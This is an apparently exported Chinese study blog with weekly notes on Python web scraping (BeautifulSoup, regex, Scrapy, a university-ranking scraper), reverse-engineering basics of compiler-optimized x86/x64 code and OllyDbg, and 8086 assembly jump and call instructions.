<h3 id="BeautifulSoup-基本元素">BeautifulSoup 基本元素</h3>
<p><img src="https://s1.ax1x.com/2020/03/19/8yjZ5R.md.png" alt="8yjZ5R.md.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/19/8yjEVJ.md.png" alt="8yjEVJ.md.png"></p>
<p>例：<br>
打印标签</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">r=requests.get(<span class="string">&quot;https://python123.io/ws/demo.html&quot;</span>)</span><br><span class="line">demo=r.text</span><br><span class="line">soup=BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)  <span class="comment">#parser:html解析器</span></span><br><span class="line">soup.title  <span class="comment">#打印title标签</span></span><br><span class="line">soup.a.attrs[<span class="string">&quot;href&quot;</span>]   <span class="comment">#打印标签的链接</span></span><br></pre></td></tr></table></figure>
<h3 id="html-内容遍历">html 内容遍历</h3>
<p>html–树形结构<br>
遍历：下行遍历、上行遍历、平行遍历</p>
<h4 id="下行遍历：">下行遍历：</h4>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFk0H.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(child) <span class="keyword">in</span> soup.body.children:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">获得子节点的数量：</span><br><span class="line"><span class="built_in">len</span>(soup.body.contents)</span><br><span class="line"></span><br><span class="line">获得其中某个的内容：</span><br><span class="line">soup.body.contents[<span class="number">1</span>]   <span class="comment">#获得第二个</span></span><br></pre></td></tr></table></figure>
<p>ps:'儿子节点’这种叫法听起来真是贼奇怪</p>
<h4 id="上行遍历：">上行遍历：</h4>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFPXD.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">查看父标签:</span><br><span class="line">soup.title.parent</span><br><span class="line">最高级标签（&lt;html&gt;他爸是他自己（.....)</span><br><span class="line"></span><br><span class="line">完整遍历：</span><br><span class="line">soup=BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> soup.a.parents:</span><br><span class="line">    <span class="keyword">if</span> parent <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent)</span><br></pre></td></tr></table></figure>
<h4 id="平行遍历：">平行遍历：</h4>
<p>发生在同一个父节点下的各个节点间<br>
平行遍历获得的下一个结点不一定是标签类型</p>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFFne.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">查看下一个平行标签:</span><br><span class="line">soup.a.next_sibling</span><br><span class="line">查看前一个平行标签:</span><br><span class="line">soup.a.previous_sibling</span><br><span class="line"></span><br><span class="line">完整：</span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.<span class="built_in">next</span>（或前序结点previous）_siblings:</span><br><span class="line">    <span class="built_in">print</span>(sibling)</span><br></pre></td></tr></table></figure>
<h3 id="Prettify">Prettify</h3>
<p>作用：在每个标签后添加换行符，print 的时候易于阅读<br>
使用方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.prettify())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(soup.a.prettify())    <span class="comment">#单独对某个标签进行处理</span></span><br></pre></td></tr></table></figure>
<p> </p>
<p>以上为 2020.3.16-2020.3.21</p>
<hr>
<h2 id="正则表达式">正则表达式</h2>
<p>regular expression (RE)</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>.</td>
<td>任何单个字符</td>
<td></td>
</tr>
<tr>
<td>[ ]</td>
<td>字符集</td>
<td>[abc]:a、b、c; [a-z]:a~z 单个字符</td>
</tr>
<tr>
<td>[^ ]</td>
<td>非字符集</td>
<td>[^abc]: 非 a、b、c 的单个字符</td>
</tr>
<tr>
<td>*</td>
<td>前一个字符 0 次或无限次扩展</td>
<td>abc *：ab、abc、abcc… …</td>
</tr>
<tr>
<td>+</td>
<td>前一个字符 1 次或无限次扩展</td>
<td>abc *：abc、abcc… …</td>
</tr>
<tr>
<td>?</td>
<td>前一个字符 0 次或 1 次扩展</td>
<td>abc *：abc、abcc… …</td>
</tr>
<tr>
<td>\</td>
<td></td>
<td>左右表达式任意一个： abc\ def :abc 或 def</td>
</tr>
<tr>
<td>{num}</td>
<td>扩展前一个字符 m 次</td>
<td>ab{2}c：abbc</td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串开头</td>
<td>^abc:abc 在字符串的开头</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
<td>$abc:abc 在字符串的结尾</td>
</tr>
<tr>
<td>( )</td>
<td>分组标记，内部使用\</td>
<td>操作符 (abc):abc; (abc</td>
</tr>
<tr>
<td>\d</td>
<td>等价于 0~9</td>
<td></td>
</tr>
<tr>
<td>\w</td>
<td>等价于 A ~ Z, a ~ z, 0 ~ 9, _</td>
<td></td>
</tr>
</tbody>
</table>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9yZWdleHAvcmVnZXhwLXR1dG9yaWFsLmh0bWw=">https://www.runoob.com/regexp/regexp-tutorial.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Re-库">Re 库</h2>
<h3 id="调用方法">调用方法</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br></pre></td></tr></table></figure>
<h3 id="表达式的表达类型">表达式的表达类型</h3>
<p>raw string：不包含转义符(\)的字符串<br>
string 类型(将’‘理解为转义符)<br>
raw string 如：r’[1-9]\d{5}‘、r’\d{3}-\d{8}\d{4}-\d{7}’<br>
string 如：[1-9]\\d{5}‘\\d{3}-\\d{8}\\d{4}-\\d{7}’</p>
<h3 id="主要功能函数">主要功能函数</h3>
<p><img src="https://s1.ax1x.com/2020/03/26/GSHMGD.png" alt=" "></p>
<ol>
<li>re.search(pattern,string,flags=0)</li>
<li>re.match(pattern,string,flags=0)</li>
<li>re.findall(pattern,string,flags=0)</li>
<li>re.finditer(pattern,stirng,flags=0)</li>
</ol>
<p>pattern: 正则表达式的字符串或原生字符串表示<br>
string：待匹配字符串</p>
<p>flags：正则表达式使用时的一些控制标记，包括：<br>
re. I:ignorecase, 忽略大小写<br>
re. M:multiline, 使用’^‘时将每行都当作匹配开始<br>
re. S:dotall, 让’.'匹配所有字符，包括换行符</p>
<ol start="5">
<li>re.search(pattern,string,maxsplit=0,flags=0)</li>
</ol>
<p>maxsplit: 最大分割数，限制分割的数量为 n，将剩下的所有部分输出为第 n+1 个</p>
<ol start="6">
<li>re.sub(pattern,repl,string,count=0,flags=0)</li>
</ol>
<p>repl: 替换的字符串<br>
count：替换的最大次数<br>
 </p>
<p>以上为2020.03.22-2020.03.28</p>
<hr>
<h3 id="RE库的match对象">RE库的match对象</h3>
<p>用 type(match)检查 match 的类型</p>
<p><img src="https://s1.ax1x.com/2020/04/02/GGx6qs.png" alt=" "><br>
<img src="https://s1.ax1x.com/2020/04/02/GGxyrj.png" alt=" "></p>
<h3 id="贪婪匹配和最小匹配">贪婪匹配和最小匹配</h3>
<p>re库默认采用贪婪匹配，即输出匹配最长的子串</p>
<h2 id="Scrapy库">Scrapy库</h2>
<h3 id="scrapy爬虫框架安装">scrapy爬虫框架安装</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install scrapy</span><br><span class="line">scrapy -h    # 测试安装成功</span><br></pre></td></tr></table></figure>
<h3 id="scrapy-爬虫框架结构">scrapy 爬虫框架结构</h3>
<p>5个主体+2个中间件<br>
3个主体（engine+downloader+scheduler）为已有实现<br>
2个主体（item pipelines+spiders）为用户配置：<br>
item pipelines对获得信息进行处理<br>
spiders提供url和解析网页的内容</p>
<p>**以下3个不需要用户配置<br>
engine控制所有模块之间的数据流，根据条件触发事件<br>
downloader根据请求下载<br>
scheduler对所有爬取进行调度<br>
在以上三个中有一个中间件：downloader middleware</p>
<h3 id="scrapy库爬虫常用命令">scrapy库爬虫常用命令</h3>
<p>格式：scrapy<command>[options][args]<br>
一个工程是最大的单元（大的scrapy框架），其中有多个spider<br>
<img src="https://s1.ax1x.com/2020/04/05/GBh3Pf.png" alt=" "></p>
<h3 id="实例">实例</h3>
<p>…</p>
<h2 id="实例-2">实例</h2>
<h3 id="中国大学排名爬取">中国大学排名爬取</h3>
<p>数据来源：<span class="exturl" data-url="aHR0cDovL3d3dy56dWloYW9kYXh1ZS5jb20venVpaGFvZGF4dWVwYWltaW5nMjAxOS5odG1s">软科中国最好大学排名2019<i class="fa fa-external-link-alt"></i></span></p>
<ol>
<li>获取网页内容：gethtmltext()</li>
<li>提取信息到合适的数据结构：fillunivlist()</li>
<li>输出结果：printunivlist()</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethtmltext</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillunivlist</span>(<span class="params">ulist,html</span>):</span></span><br><span class="line">    soup=BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">&#x27;tbody&#x27;</span>).children:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tr,bs4.element.Tag):</span><br><span class="line">            tds=tr(<span class="string">&#x27;td&#x27;</span>)</span><br><span class="line">            ulist.append([tds[<span class="number">0</span>].string,tds[<span class="number">1</span>].string,tds[<span class="number">3</span>].string])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printunivlist</span>(<span class="params">ulist,num</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;排名&quot;</span>,<span class="string">&quot;学校名称&quot;</span>,<span class="string">&quot;总分&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        u=ulist[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;&quot;</span>.<span class="built_in">format</span>(u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>]))</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;suc&quot;</span>+<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    uinfo=[]<span class="comment"># 存放大学信息</span></span><br><span class="line">    url=<span class="string">&quot;http://www.zuihaodaxue.com/zuihaodaxuepaiming2019.html&quot;</span></span><br><span class="line">    html=gethtmltext(url)</span><br><span class="line">    fillunivlist(uinfo,html)</span><br><span class="line">    printunivlist(uinfo,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.03.23-2020.03.29</title>
    <url>/50551.html</url>
    <content><![CDATA[<h1>32位软件逆向技术</h1>
<h2 id="控制语句">控制语句</h2>
<h3 id="条件设置指令（SETcc）">条件设置指令（SETcc）</h3>
<p>条件设置指令的形式是“SET<u>cc</u> r/m8”， r/m8表示8位寄存器或单字节内存单元<br>
条件设置指令测试一些标志位，把结果记录的目标操作数中<br>
测试：</p>
<ol>
<li>of（=1溢出）</li>
<li>zf（=1操作后等于0/相等）</li>
<li>cf（=1进位/低于）</li>
<li>cf、zf结合判断</li>
<li>sf（=1操作后结果为负）</li>
<li>pf（=1，1个数为偶数）</li>
<li>sf、of结合判断（=1小于）</li>
<li>zf（=1或zf!=of，不大于）</li>
</ol>
<blockquote>
<p><a href="https://brubbish.github.io/34199.html#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">https://brubbish.github.io/34199.html#标志寄存器</a></p>
</blockquote>
 <span id="more"></span>
<p>条件设置指令可以用来消除程序中的转移指令<br>
如：<br>
<img src="https://s1.ax1x.com/2020/03/22/8IMgHA.png" alt=" "></p>
<h3 id="纯算法实现逻辑判断">纯算法实现逻辑判断</h3>
<p>一些编译器在优化的时候，会不改变原逻辑的情况下，使用数学技巧把代码中的一些逻辑分支语句转换为算术操作，减少程序中的条件转移指令，提高cpu的流水线的性能（…tql)</p>
<h2 id="循环语句">循环语句</h2>
<p>可以进行反向引用<br>
其他类型的分支语句，如if-else都是由低地址向高地址区域引用的（向下跳），依此可以将循环语句识别出来（调回去）<br>
确定某段代码是循环代码后就可以分析计数器（一般用ecx）</p>
<p>如果编译时设置优化“Maximize Speed”：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx             ;变量初始化sum=0</span><br><span class="line">xor eax,eax             ；变量初始化i=0</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
<h2 id="数学运算符">数学运算符</h2>
<p>如果编译器没有进行优化，则这些运算符很容易理解（…)所以下面都是经过优化的</p>
<h3 id="整数的加法和减法">整数的加法和减法</h3>
<p>用lea代替add和sub<br>
lea指令允许用户在一个时钟内完成对c=a+b+78h（某个数）的计算，其中abc都是在有寄存器的情况下才有效的，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea c,[a+b+78]</span><br><span class="line">=&gt;</span><br><span class="line">mov eax,dword ptr [esp]     ;eax=a</span><br><span class="line">mov ecx,dword ptr [esp]     ;ecx=b</span><br><span class="line">lea edx,dword ptr [ecx+eax+78]</span><br></pre></td></tr></table></figure>
<blockquote>
<p>时钟周期：一个时钟脉冲所需要的时间。（计组）</p>
</blockquote>
<h3 id="整数的乘法">整数的乘法</h3>
<p>一般被编译成mul（无符号）、imul（有符号）指令（运行慢），为了提高效率会用其他指令完成<br>
如果一个数是2的幂，用左移指令shl；3、5、6、7、9等数用加法提高效率：如把exa*5写成&quot;lea eax,[eax+4 *4];lea指令可以实现寄存器乘以2、4、8的运算</p>
<h3 id="整数的除法">整数的除法</h3>
<p>一般被编译成div、idiv指令，大概比乘法运算多消耗10倍cpu时钟<br>
如果除数是2的幂，可用右移指令’shr a,n’：a是被除数，n是2的指数（进行无符号数计算）有符号数用sar指令</p>
<p>除法指令需要用到符号扩展指令cdq，作用是把eax中的数视为有符号数，将eax的最高位（符号位）扩展到edx中。如果eax最高位是1，执行后edx=FFFFFFFF;如果是0，edx=00000000。通过这种方法把32位有符号数变为edx：eax的64位有符号数，满足64位运算指令的需要。</p>
<p>对除法优化时会用乘法代替除法，优化的公式较多，一例如：倒数相乘a*b=a *(1/b)</p>
<p>（在下面的64位中描述更完整）</p>
<h2 id="文本字符串">文本字符串</h2>
<h3 id="字符寻址指令">字符寻址指令</h3>
<p>与字符指针处理相关的指令有mov、lea等<br>
mov指令将地址/寄存器中的数据放到目的寄存器中，如mov eax [401000]/[ecx]<br>
lea（load effective address）操作数是地址,lea eax,[addr] 就是把addr的地址放入eax中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea eax,[401000]</span><br><span class="line">等价于</span><br><span class="line">mov eax,401000</span><br></pre></td></tr></table></figure>
<h3 id="计算字符串长度">计算字符串长度</h3>
<p>c语言的strlen()：<br>
<img src="https://s1.ax1x.com/2020/03/25/8xCwqg.png" alt=" "></p>
<h1>64位软件逆向技术</h1>
<p>x64通用寄存器的名称第一个字母由e改为r，共16个；16个128位xmm寄存器（通常用于优化代码）<br>
<img src="https://s1.ax1x.com/2020/03/25/8xCDaj.png" alt=" "></p>
<h2 id="函数">函数</h2>
<h3 id="栈平衡">栈平衡</h3>
<p>每8字节的栈空间用来保存一个数据<br>
尽量保证栈顶对齐值为16（可以被16整除）</p>
<h3 id="调用约定">调用约定</h3>
<p>x86（32位）的函数调用有stdcall、__cdecl、fastcall等，x64只有一种寄存器快速调用约定：</p>
<ol>
<li>整数：前四个参数用寄存器rcx→rdx→r8→r9，其余放在栈里，入栈顺序从右到左，任何大于8字节或不是1、2、4、8字节的参数用地址传递</li>
<li>浮点数：前四个参数用xmm寄存器完成：xmm0→xmm1→xmm2→xmm3</li>
</ol>
<p><img src="https://s1.ax1x.com/2020/03/25/8xCBZQ.png" alt=" "></p>
<p>栈为函数的前四个参数预留了32字节的空间，当函数功能复杂时将寄存器的参数保存到这个预留栈空间。预览栈空间由函数调用者申请、平衡</p>
<h2 id="数学运算">数学运算</h2>
<h3 id="整数的除法-2">整数的除法</h3>
<ol>
<li>有符号数，除数为2^n<br>
x&gt;=0,x/2^n=x&gt;&gt;n<br>
x&lt;0,x/2^n=（x+（2^n-1））&gt;&gt;n<br>
除数为-2^n时最后用’neg 寄存器’指令求补</li>
<li>有符号数，除数为正，非2^n<br>
32位：x&gt;=0,result=(x<em>c&gt;&gt;32)+x&gt;&gt;n,&lt;0时结果再+1<br>
64位：x&gt;=0,result=(x</em>c&gt;&gt;64)+x&gt;&gt;n,&lt;0时结果再+1</li>
<li>有符号数，除数为负，非2^n<br>
32位：x&gt;=0,result=(x<em>c&gt;&gt;32)-x&gt;&gt;n,&lt;0时结果再+1<br>
64位：x&gt;=0,result=(x</em>c&gt;&gt;64)-x&gt;&gt;n,&lt;0时结果再+1</li>
</ol>
<ul>
<li>c为魔数</li>
</ul>
<ol start="4">
<li>无符号数，除数位2^n<br>
用shr右移</li>
<li>无符号数，除数非2^n<br>
32位：x&gt;=0,result=x<em>c&gt;&gt;32&gt;&gt;n<br>
62位：x&gt;=0,result=x</em>c&gt;&gt;62&gt;&gt;n</li>
</ol>
<h2 id="整数取模">整数取模</h2>
<p>可以用除法指令，但是除法指令执行周期较长，通常优化将其转换成位运算或除法运算，再用除法运算进行优化</p>
<ol>
<li>除数b=2^n<br>
取得被除数二进制数的最后n位，负数要在n位之前补1：<br>
x&gt;=0,result=x&amp;(b-1);x&lt;0,result=(x&amp;(b-1))-1|(~b-1)+1</li>
<li>除数b!=2^n<br>
采用“余数=被除数-商<em>除数”<br>
result=x-x/b</em>b</li>
</ol>
<h1>使用 OllyDbg 从零开始 Cracking</h1>
<h2 id="数制系统">数制系统</h2>
<p>十六进制负数</p>
<p>从00000000~FFFFFFFF<br>
正数：00000000~7FFFFFFF<br>
负数：80000000~FFFFFFFF(-1)<br>
在od左下角的commandbar可查询十六进制数的十进制值和对应的ASCII字符：<u>? [十六进制值]</u></p>
<h2 id="寄存器">寄存器</h2>
<h3 id="标志寄存器">标志寄存器</h3>
<p><img src="https://s1.ax1x.com/2020/04/02/GGxsMQ.png" alt=" "></p>
<ol>
<li>
<p>o，溢出标志<br>
记录了有符号数运算的结果是否发生了溢出，如果发生溢出OF=1，如果没有OF=0</p>
</li>
<li>
<p>p，奇偶标志<br>
指令的结果用二进制表示时1的总数，如果为偶数PF=1，如果不为偶数PF=0</p>
</li>
<li>
<p>z，零标志<br>
记录相关指令执行后结果是否为0，如果为0那么ZF=1，如果不为0那么ZF=0</p>
</li>
<li>
<p>s，符号标志<br>
运算结果为负设置为1，结果为正设置为0</p>
</li>
<li>
<p>c，进位标志<br>
记录了无符号运算的结果是否有向更高位的进位（9位），有置1，无置0</p>
</li>
<li>
<p>其他</p>
</li>
</ol>
<h1>python爬虫学习</h1>
<p><a href="https://brubbish.github.io/710f8e5f.html##%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://brubbish.github.io/710f8e5f.html##正则表达式</a></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.10-2020.02.16</title>
    <url>/34199.html</url>
    <content><![CDATA[<h1>汇编学习</h1>
<h2 id="offset">offset</h2>
<p>功能是取得标号的偏移地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">    start:mov ax,offset start</span><br><span class="line">    &lt;!-- 相当于mov ax,0 --&gt;</span><br><span class="line">    s:mov ax,offstet s</span><br><span class="line">    &lt;!-- 相当于mov ax,3 --&gt;</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>offset取得了标号start和s的偏移地址：0和3</p>
<span id="more"></span>
<h2 id="jmp">jmp</h2>
<h3 id="依据位移进行转移的jmp指令">依据位移进行转移的jmp指令</h3>
<h4 id="1-jmp-short-标号">1.jmp short 标号</h4>
<p>实现段内短转移，对ip修改范围为：-128~127字节<br>
例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....</span><br><span class="line">start:mov ax,0</span><br><span class="line">      jmp short s</span><br><span class="line">      add ax,1</span><br><span class="line">    s:inc ax</span><br><span class="line">....</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行后ax=1</p>
<p>“依据位移进行转移”:指令对应的机器码中不包含转移的目的地址，而是转移的位移，位移由编译器根据汇编指令计算</p>
<p>jmp short 标号 == （ip）+=8位位移</p>
<ul>
<li>8位位移=标号处的地址 - jmp指令后第一个字节的地址</li>
<li>short 指明位移为8位</li>
<li>8位位移在编译时算出，在机器码中用补码表示</li>
</ul>
<h4 id="2-jmp-near-ptr-标号">2.jmp near ptr 标号</h4>
<p>与jump short 标号 相似<br>
功能为：ip+16位位移</p>
<h3 id="转移的目的地址在指令中的jmp指令">转移的目的地址在指令中的jmp指令</h3>
<h4 id="1-jmp-far-ptr-标号">1.jmp far ptr 标号</h4>
<p>用标号的段地址和偏移地址修改cs和ip<br>
实现的是段间转移（远转移）<br>
功能为：<br>
 (cs)=标号所在段地址 <br>
（ip）=标号所在偏移地址<br>
<strong>机器码：EA0B01BD0B</strong><br>
<strong>对应：jmp 0BBD:0B01</strong></p>
<h3 id="转移地址在寄存器中的jmp指令">转移地址在寄存器中的jmp指令</h3>
<h4 id="1-jmp-16位寄存器">1.jmp 16位寄存器</h4>
<p>（ip）=（16位寄存器）</p>
<h3 id="转移地址在内存中的jmp指令">转移地址在内存中的jmp指令</h3>
<h4 id="1-jmp-word-ptr-内存单元地址（段内转移）">1.jmp word ptr 内存单元地址（段内转移）</h4>
<p>内存单元地址处开始存放的一个字作为偏移地址<br>
内存单元地址可用寻址方式的任一格式给出</p>
<h4 id="2-jmp-dword-ptr-内存单元地址（段间转移）">2.jmp dword ptr 内存单元地址（段间转移）</h4>
<p>高地址处的字是转移到目的地段地址，低地址处是转移到目的偏移地址：<br>
 （cs）=（内存单元地址+2）<br>
 （ip）=（内存单元地址)</p>
<p>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,0123</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure>
<p>(cs)=0,(ip)=0123</p>
<h2 id="jcxz">jcxz</h2>
<p>为有条件转移指令</p>
<p><em>所有有条件的转移指令都是短转移，在机器码中包含的是位移而不是目的地址，ip修改范围为：-128~127</em></p>
<p>格式：jcxz 标号<br>
相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if((cx)==0)</span><br><span class="line">    jmp short 标号</span><br></pre></td></tr></table></figure>
<h2 id="loop">loop</h2>
<p><em>所有循环指令都是短转移在机器码中包含的是位移而不是目的地址，ip修改范围为：-128~127</em><br>
格式：loop 标号<br>
相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(cx)--;</span><br><span class="line">if((cx)!=0)</span><br><span class="line">    jmp short 标号;</span><br></pre></td></tr></table></figure>
<h2 id="根据位移进行转移的意义">根据位移进行转移的意义</h2>
<p>在机器码中包含的是位移而不是目的地址—这种设计方便了程序段在内存中的浮动装配，在不同位置都可正确执行</p>
<h2 id="call和ret指令">call和ret指令</h2>
<p>call和ret都是转移指令，修改ip或同时修改cs和ip</p>
<h3 id="ret和retf">ret和retf</h3>
<p>ret用栈中的数据修改ip实现近转移，相当于:<br>
pop ip<br>
retf用栈中的数据修改cs和ip实现远转移，相当于:<br>
 pop ip<br>
 pop cs<br>
 </p>
<h3 id="call">call</h3>
<p>CPU执行call时：<br>
1.将ip或cs和ip压入栈<br>
2.实现长转移<br>
<strong>call不能实现短转移</strong></p>
<h3 id="1-依据位移进行转移的call指令">1.依据位移进行转移的call指令</h3>
<p>call 标号<br>
执行时进行如下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((sp)*16+(sp))=(ip)</span><br><span class="line">(ip)=(ip)+16位位移</span><br></pre></td></tr></table></figure>
<p>将当前ip压栈后，转到标号处<br>
相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp near ptr 标号</span><br></pre></td></tr></table></figure>
<h3 id="2-转移的目的地址在指令中的call指令">2.转移的目的地址在指令中的call指令</h3>
<p>call far ptr 标号<br>
执行时进行如下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(sp)=(sp)-2</span><br><span class="line">((ss)*16+(sp))=(cs)</span><br><span class="line">(sp)=(sp)-2</span><br><span class="line">((sp)*16+(sp))=(ip)</span><br></pre></td></tr></table></figure>
<p>相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push cs</span><br><span class="line">push ip</span><br><span class="line">jmp far ptr 标号</span><br></pre></td></tr></table></figure>
<h3 id="3-转移地址在寄存器中的call指令">3.转移地址在寄存器中的call指令</h3>
<p>call 16位寄存器<br>
相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp 16位寄存器</span><br></pre></td></tr></table></figure>
<h3 id="4-转移地址在内存中的call指令">4.转移地址在内存中的call指令</h3>
<h4 id="4-1-call-word-ptr-内存单元地址">4.1.call word ptr 内存单元地址</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ip</span><br><span class="line">jmp word ptr 内存单元地址</span><br></pre></td></tr></table></figure>
<h4 id="4-2-call-dword-ptr-内存单元地址">4.2.call dword ptr 内存单元地址</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push cs</span><br><span class="line">push ip</span><br><span class="line">jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure>
<h3 id="call-和-ret配合使用">call 和 ret配合使用</h3>
<p>实现子程序，用call指令执行子程序，再用ret指令转到call指令后的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标号：</span><br><span class="line">    ....</span><br><span class="line">    指令</span><br><span class="line">    ....</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure>
<h2 id="mul指令">mul指令</h2>
<p>乘法指令</p>
<p>注意：</p>
<ul>
<li>两个相乘的数要么都是8位，要么都是16位<br>
 1.如果是8位，一个默认放在al中，另一个放在8位寄存器或内存字节单元中。结果默认放在ax中<br>
 2.如果是16位，一个默认在ax中，另一个放在16位寄存器或内存字单元中。结果高位默认放在dx中，低位2放在ax中</li>
</ul>
<p>格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mul 寄存器/内存单元</span><br></pre></td></tr></table></figure>
<p>如：<br>
1.100*10</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov al,100</span><br><span class="line">mov bl,10</span><br><span class="line">mul bl</span><br></pre></td></tr></table></figure>
<p>结果：(ax)=1000</p>
<p>2.100*10000</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,100</span><br><span class="line">mov bx,10000</span><br><span class="line">mul bx</span><br></pre></td></tr></table></figure>
<p>结果：(ax)=4240h (dx)=000fh<br>
(f4240h=1000000)</p>
<h2 id="一个公式">一个公式</h2>
<p> 将可能产生溢出的除法运算转变为多个不会产生溢出的除法运算(商小于65536)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/n=int (h/n)*65536+[ rem(h/n)*65536+l]/n  </span><br></pre></td></tr></table></figure>
<p>x : 被除数(0,ffffffff)<br>
n : 除数(0,ffff)<br>
h : x高16位<br>
l : x低16位<br>
int() : 取商<br>
rem() : 取余</p>
<h2 id="标志寄存器">标志寄存器</h2>
<p>标志寄存器作用：<br>
1.用来储存相关指令的执行结果<br>
2.用来为CPU执行相关指令提供行为依据<br>
3.用来控制CPU的相关工作方式<br>
8086CPU有16位，其中储存的信息被称为程序状态字（psw）<br>
<strong>flag是按位起作用的，每一位都有专门的含义，记录特定的信息</strong></p>
